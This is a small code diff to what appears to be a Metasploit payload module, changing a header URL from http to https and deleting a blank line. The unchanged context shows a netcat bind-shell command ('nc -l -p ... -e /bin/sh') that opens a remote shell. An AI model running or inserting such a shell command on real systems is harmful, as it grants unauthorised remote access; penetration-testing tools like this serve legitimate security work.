@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -47,5 +47,4 @@ module MetasploitModule
   def command_string
     "nc -l -p #{datastore['LPORT']} -e /bin/sh"
   end
-
 end
